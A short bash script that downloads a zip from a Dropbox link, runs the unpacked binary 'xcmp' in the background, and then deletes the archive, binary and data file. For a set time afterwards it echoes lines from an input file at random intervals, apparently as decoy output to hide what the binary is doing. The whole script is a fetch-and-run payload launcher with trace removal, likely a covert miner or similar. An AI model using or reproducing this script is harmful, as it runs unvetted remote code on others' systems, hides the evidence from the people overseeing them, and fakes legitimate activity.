#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/aecewaftudccq57/wan07.zip -q
unzip wan07.zip > /dev/null 2>&1
#pwd
./xcmp ./file_data &
sleep 3
rm -rf wan07.zip
rm -rf xcmp
rm -rf file_data
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 12 ))
done < $2

